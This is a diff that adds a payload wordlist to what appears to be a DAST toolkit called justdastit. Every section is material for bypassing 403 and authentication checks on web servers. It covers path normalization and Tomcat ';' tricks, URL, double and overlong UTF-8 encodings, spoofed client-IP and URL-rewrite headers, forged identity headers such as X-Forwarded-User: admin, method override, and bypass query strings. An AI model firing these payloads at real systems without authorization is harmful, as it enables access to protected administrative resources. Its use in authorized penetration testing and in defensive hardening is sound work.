@@ -1,0 +1,377 @@
+# =============================================================================
+# 403 Bypass / Authentication Bypass Payloads
+# justdastit DAST toolkit
+# =============================================================================
+# Categories: Path normalization, header tricks, method override, encoding,
+#             case manipulation, extension append, trailing chars,
+#             HTTP version downgrade
+# =============================================================================
+# Usage: Replace FUZZ or {path} with the target path (e.g., /admin)
+# Some payloads are absolute paths; others are header-based
+# =============================================================================
+
+# -----------------------------------------------------------------------------
+# PATH NORMALIZATION TRICKS
+# -----------------------------------------------------------------------------
+/{path}
+/{path}/
+/{path}/.
+/{path}/..
+/{path}/./
+/{path}/../
+/{path}//
+/{path}///
+//{path}
+//{path}/
+//{path}//
+///{path}
+/./{path}
+/./{path}/
+/./{path}/.
+/.//{path}
+/.;/{path}
+/.;/{path}/
+/{path}..;/
+/{path}..;
+/{path}/..;/
+/{path}/..;
+/..;/{path}
+/..;/{path}/
+/{path}..;/..;/
+/../{path}
+/../../{path}
+/{path}/../{path}
+/{path}//{path}
+/{path}/./{path}
+/{path}%20
+/{path}%20/
+/{path}%09
+/{path}%0a
+/{path}%0d
+/{path}%00
+/{path}%00/
+/{path}%00.json
+/{path}..
+/{path}...
+/{path}....
+/{path}/...
+/{path}/....
+/./{path}/./
+/..;/..;/{path}
+
+# Spring / Tomcat ..;/ normalization
+/{path}..;/
+/..;/{path}
+/{path}/..;/
+/{path}..;/..;/
+/..;/..;/{path}
+/{path}..;/{path}
+/..;/{path}/..;/
+/{path};/
+/;/{path}
+/;/{path}/
+/{path};foo=bar
+/{path};/anything
+
+# Dot segment variations
+/{path}/.
+/{path}/./
+/{path}/..
+/{path}/../
+/{path}/./../../{path}
+/{path}/.randomstring/../{path}
+
+# -----------------------------------------------------------------------------
+# URL ENCODING VARIANTS
+# -----------------------------------------------------------------------------
+/%2e/{path}
+/{path}/%2e
+/%2e/{path}/
+/%2e%2e/{path}
+/{path}/%2e%2e
+/{path}/%2e/
+/%2f{path}
+/{path}%2f
+/%2f/{path}/
+/%2f/{path}%2f
+/{path}%2f%2e%2e%2f{path}
+
+# Double encoding
+/%252e/{path}
+/{path}/%252e
+/%252e%252e/{path}
+/%252f{path}
+/{path}%252f
+/{path}%252f%252e%252e%252f{path}
+
+# Unicode / overlong UTF-8 encoding
+/%c0%ae/{path}
+/{path}/%c0%ae
+/%c0%ae%c0%ae/{path}
+/%e0%80%af/{path}
+/{path}/%e0%80%af
+/%c0%af{path}
+/{path}%c0%af
+
+# Mixed encoding
+/..%252f{path}
+/..%255c{path}
+/.%00./{path}
+/{path}/.%00./
+/%00/{path}
+/{path}/%00
+
+# Backslash encoding
+/{path}%5c
+/%5c{path}
+/{path}%5c..%5c{path}
+/..%5c{path}
+/..%5c..%5c{path}
+
+# -----------------------------------------------------------------------------
+# CASE MANIPULATION
+# -----------------------------------------------------------------------------
+/{PATH}
+/{Path}
+/{pAtH}
+/{pATH}
+/{PATH}/
+/{Path}/
+/ADMIN
+/Admin
+/aDmIn
+/ADMIN/
+/Admin/
+
+# -----------------------------------------------------------------------------
+# EXTENSION APPEND
+# -----------------------------------------------------------------------------
+/{path}.html
+/{path}.php
+/{path}.json
+/{path}.xml
+/{path}.asp
+/{path}.aspx
+/{path}.jsp
+/{path}.do
+/{path}.action
+/{path}.htm
+/{path}.txt
+/{path}.css
+/{path}.js
+/{path}.png
+/{path}.jpg
+/{path}.gif
+/{path}.ico
+/{path}.pdf
+/{path}.wsdl
+/{path}.xhtml
+/{path}.config
+/{path}.bak
+/{path}.old
+/{path}.orig
+/{path}.inc
+/{path}/.json
+/{path}/.html
+/{path}/.xml
+/{path}/.php
+
+# Extension with traversal
+/{path}.html/
+/{path}.json/
+/{path}.php/
+/{path}/.html/
+/{path}/.json/
+
+# Wildcard / misc extensions
+/{path}..json
+/{path}..html
+/{path}%00.json
+/{path}%00.html
+/{path}%00.php
+
+# -----------------------------------------------------------------------------
+# TRAILING CHARACTERS
+# -----------------------------------------------------------------------------
+/{path}/
+/{path}//
+/{path}///
+/{path}.
+/{path}..
+/{path}./
+/{path}../
+/{path}?
+/{path}??
+/{path}???
+/{path}#
+/{path}##
+/{path}?anything=1
+/{path}?debug=1
+/{path}?test=true
+/{path}#fragment
+/{path}%23
+/{path}%3f
+/{path}/~
+/{path}~
+/{path}!
+/{path}@
+/{path}*
+/{path}+
+
+# Trailing slash / backslash
+/{path}\
+/{path}\/
+/{path}/\
+/{path}\\
+/{path}/%20
+/{path}/%09
+/{path}/%00
+/{path}/ /
+/{path}/./
+
+# Semicolon (Tomcat / Java)
+/{path};
+/{path};/
+/{path};x
+/{path};x=y
+/{path};.css
+/{path};.js
+/{path};anything
+/{path}/;/
+/{path}/;anything
+/{path};/;/
+/;{path}
+/;{path}/
+
+# -----------------------------------------------------------------------------
+# HEADER-BASED BYPASS
+# -----------------------------------------------------------------------------
+# IP spoofing headers (add to request)
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 0.0.0.0
+X-Forwarded-For: ::1
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 172.16.0.1
+X-Forwarded-For: 192.168.0.1
+X-Forwarded-For: 192.168.1.1
+X-Real-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Originating-IP: [127.0.0.1]
+X-Custom-IP-Authorization: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+X-Backend-Host: 127.0.0.1
+
+# URL rewrite headers
+X-Original-URL: /
+X-Original-URL: /{path}
+X-Original-URL: /admin
+X-Rewrite-URL: /
+X-Rewrite-URL: /{path}
+X-Rewrite-URL: /admin
+X-Override-URL: /{path}
+
+# Host header override
+X-Forwarded-Host: localhost
+X-Host: localhost
+X-Forwarded-Server: localhost
+Host: localhost
+
+# Referer spoofing
+Referer: https://TARGET/{path}
+Referer: http://localhost/{path}
+Referer: http://127.0.0.1/{path}
+
+# User-Agent spoofing
+User-Agent: Googlebot/2.1
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+User-Agent: Bingbot/2.0
+User-Agent: internal
+User-Agent: admin
+
+# Authentication bypass headers
+X-Forwarded-User: admin
+X-Remote-User: admin
+X-Forwarded-Email: admin@localhost
+X-Auth-Token: admin
+X-Authenticated-User: admin
+X-Forwarded-Groups: admin
+
+# -----------------------------------------------------------------------------
+# METHOD OVERRIDE
+# -----------------------------------------------------------------------------
+X-HTTP-Method-Override: GET
+X-HTTP-Method-Override: POST
+X-HTTP-Method-Override: PUT
+X-HTTP-Method-Override: PATCH
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method-Override: OPTIONS
+X-HTTP-Method-Override: HEAD
+X-HTTP-Method-Override: TRACE
+X-HTTP-Method-Override: CONNECT
+X-HTTP-Method: GET
+X-HTTP-Method: PUT
+X-HTTP-Method: DELETE
+X-Method-Override: GET
+X-Method-Override: PUT
+X-Method-Override: DELETE
+
+# Actual method switching (use these HTTP methods)
+# GET /{path}
+# POST /{path}
+# PUT /{path}
+# PATCH /{path}
+# DELETE /{path}
+# OPTIONS /{path}
+# HEAD /{path}
+# TRACE /{path}
+# CONNECT /{path}
+# PROPFIND /{path}
+# MOVE /{path}
+# COPY /{path}
+# LOCK /{path}
+# UNLOCK /{path}
+
+# -----------------------------------------------------------------------------
+# HTTP VERSION DOWNGRADE
+# -----------------------------------------------------------------------------
+# Send request as HTTP/1.0 instead of HTTP/1.1
+# Send request as HTTP/0.9
+
+# -----------------------------------------------------------------------------
+# CONTENT-TYPE MANIPULATION
+# -----------------------------------------------------------------------------
+Content-Type: application/json
+Content-Type: application/xml
+Content-Type: text/html
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+Content-Type: text/plain
+
+# -----------------------------------------------------------------------------
+# COMBINED PATH + QUERY TRICKS
+# -----------------------------------------------------------------------------
+/{path}?source=admin
+/{path}?admin=true
+/{path}?debug=true
+/{path}?internal=true
+/{path}?role=admin
+/{path}?access=admin
+/{path}?bypass=true
+/{path}?test=1
+/{path}?_=timestamp
+/{path}%3b
+/{path}%3bx=y
+/{path}%23
+/{path}%3f
+/{path}%26
+/{path}?%00
+/{path}??
